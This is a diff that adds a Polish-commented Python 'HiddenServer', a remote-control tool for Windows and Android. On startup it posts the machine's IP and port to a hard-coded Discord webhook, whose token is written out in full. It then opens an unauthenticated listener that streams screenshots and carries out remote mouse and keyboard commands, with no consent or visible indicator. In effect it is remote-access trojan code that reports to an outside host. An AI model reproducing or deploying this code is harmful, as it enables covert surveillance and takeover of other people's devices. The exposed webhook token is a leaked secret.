@@ -1,1 +1,250 @@
-sraka
+import socket
+from io import BytesIO
+from PIL import Image
+import threading
+import time
+import sys
+import platform
+import subprocess
+import requests
+import json
+
+# Konfiguracja
+HOST = '0.0.0.0'
+PORT = 65432
+RESOLUTION = (1024, 768)
+QUALITY = 50
+UPDATE_INTERVAL = 0.2
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1378474941045018634/QaOiWrL8siJz-KuALFPrN-EGooOccAteLK1iR1rvTSiSp8cIhUSkydMEgLTNueLrJXB_"
+
+def get_local_ip():
+    """Pobiera lokalne IP serwera"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return socket.gethostbyname(socket.gethostname())
+
+def send_ip_to_discord(ip):
+    """Wysyła IP na webhook Discord"""
+    message = f"🖥️ Serwer RDP uruchomiony na: `{ip}:{PORT}`\n\nAby się połączyć, użyj tego IP w kliencie."
+    
+    data = {
+        "content": message,
+        "username": "Remote Desktop Server",
+        "embeds": [{
+            "title": "Informacje o połączeniu",
+            "fields": [
+                {"name": "IP", "value": ip, "inline": True},
+                {"name": "Port", "value": str(PORT), "inline": True}
+            ],
+            "color": 5814783
+        }]
+    }
+    
+    try:
+        response = requests.post(
+            DISCORD_WEBHOOK,
+            data=json.dumps(data),
+            headers={"Content-Type": "application/json"}
+        )
+        if response.status_code != 204:
+            print(f"Błąd wysyłania webhooka: {response.status_code}")
+    except Exception as e:
+        print(f"Błąd połączenia z Discord: {e}")
+
+class AndroidController:
+    @staticmethod
+    def tap(x, y):
+        subprocess.run(f"input tap {x} {y}", shell=True)
+    
+    @staticmethod
+    def swipe(x1, y1, x2, y2, duration=100):
+        subprocess.run(f"input swipe {x1} {y1} {x2} {y2} {duration}", shell=True)
+    
+    @staticmethod
+    def keyevent(key):
+        subprocess.run(f"input keyevent {key}", shell=True)
+
+class CrossPlatformController:
+    def __init__(self):
+        self.system = platform.system()
+        if self.system == "Windows":
+            import pyautogui
+            self.controller = pyautogui
+        else:  # Android
+            self.controller = AndroidController()
+    
+    def moveTo(self, x, y):
+        if self.system == "Windows":
+            self.controller.moveTo(x, y)
+    
+    def mouseDown(self, button='left'):
+        if self.system == "Windows":
+            self.controller.mouseDown(button=button)
+        else:
+            x, y = self.controller.position()
+            self.controller.tap(x, y)
+    
+    def mouseUp(self, button='left'):
+        if self.system == "Windows":
+            self.controller.mouseUp(button=button)
+    
+    def doubleClick(self):
+        if self.system == "Windows":
+            self.controller.doubleClick()
+        else:
+            x, y = self.controller.position()
+            self.controller.tap(x, y)
+            time.sleep(0.1)
+            self.controller.tap(x, y)
+    
+    def press(self, key):
+        if self.system == "Windows":
+            self.controller.press(key)
+        else:
+            key_events = {
+                'enter': '66',
+                'esc': '111',
+                'space': '62',
+            }
+            if key.lower() in key_events:
+                self.controller.keyevent(key_events[key.lower()])
+
+class HiddenServer:
+    def __init__(self):
+        self.running = True
+        self.connection = None
+        self.lock = threading.Lock()
+        self.controller = CrossPlatformController()
+        
+    def start(self):
+        # Pobierz i wyślij IP przed uruchomieniem serwera
+        local_ip = get_local_ip()
+        print(f"Twój adres IP do połączenia: {local_ip}")
+        send_ip_to_discord(local_ip)
+        
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind((HOST, PORT))
+            s.listen()
+            print(f"Serwer nasłuchuje na {HOST}:{PORT}")
+            
+            while self.running:
+                try:
+                    conn, addr = s.accept()
+                    with self.lock:
+                        self.connection = conn
+                    print(f"Połączono z {addr}")
+                    
+                    threading.Thread(target=self.handle_client, args=(conn,), daemon=True).start()
+                    threading.Thread(target=self.send_screencast, args=(conn,), daemon=True).start()
+                    
+                except Exception as e:
+                    print(f"Błąd: {e}")
+                    if self.connection:
+                        self.connection.close()
+    
+    def get_screenshot(self):
+        if platform.system() == "Windows":
+            import pyautogui
+            return pyautogui.screenshot().resize(RESOLUTION)
+        else:
+            try:
+                screenshot = subprocess.run("screencap -p", shell=True, capture_output=True)
+                return Image.open(BytesIO(screenshot.stdout)).resize(RESOLUTION)
+            except:
+                return Image.new('RGB', RESOLUTION, color='black')
+    
+    def send_screencast(self, conn):
+        while self.running:
+            try:
+                with self.lock:
+                    if not self.connection:
+                        break
+                        
+                    screenshot = self.get_screenshot()
+                    img_byte_arr = BytesIO()
+                    screenshot.save(img_byte_arr, format='JPEG', quality=QUALITY)
+                    img_data = img_byte_arr.getvalue()
+                    
+                    try:
+                        conn.sendall(len(img_data).to_bytes(4, 'big') + img_data)
+                    except:
+                        with self.lock:
+                            self.connection = None
+                        break
+                
+                time.sleep(UPDATE_INTERVAL)
+                
+            except Exception as e:
+                print(f"Błąd screencastu: {e}")
+                with self.lock:
+                    self.connection = None
+                break
+    
+    def handle_client(self, conn):
+        buffer = ""
+        while self.running:
+            try:
+                data = conn.recv(1024).decode('utf-8')
+                if not data:
+                    break
+                    
+                buffer += data
+                
+                while '\n' in buffer:
+                    command, buffer = buffer.split('\n', 1)
+                    command = command.strip()
+                    if not command:
+                        continue
+                        
+                    print(f"Otrzymano: {command}")
+                    
+                    try:
+                        if command.startswith("MOVE"):
+                            parts = command.split()
+                            if len(parts) == 3:
+                                _, x, y = parts
+                                x, y = int(x), int(y)
+                                if platform.system() == "Windows":
+                                    screen_width, screen_height = self.controller.size()
+                                else:
+                                    screen_width, screen_height = RESOLUTION
+                                scale_x = screen_width / RESOLUTION[0]
+                                scale_y = screen_height / RESOLUTION[1]
+                                self.controller.moveTo(x * scale_x, y * scale_y)
+                        
+                        elif command == "LEFT_DOWN":
+                            self.controller.mouseDown(button='left')
+                        elif command == "LEFT_UP":
+                            self.controller.mouseUp(button='left')
+                        elif command == "RIGHT_DOWN":
+                            self.controller.mouseDown(button='right')
+                        elif command == "RIGHT_UP":
+                            self.controller.mouseUp(button='right')
+                        elif command == "DOUBLE_CLICK":
+                            self.controller.doubleClick()
+                        elif command.startswith("KEY"):
+                            _, key = command.split(maxsplit=1)
+                            self.controller.press(key)
+                            
+                    except Exception as e:
+                        print(f"Błąd wykonania {command}: {e}")
+                        
+            except Exception as e:
+                print(f"Błąd połączenia: {e}")
+                with self.lock:
+                    self.connection = None
+                break
+
+if __name__ == "__main__":
+    server = HiddenServer()
+    try:
+        server.start()
+    except KeyboardInterrupt:
+        server.running = False
+        sys.exit(0)
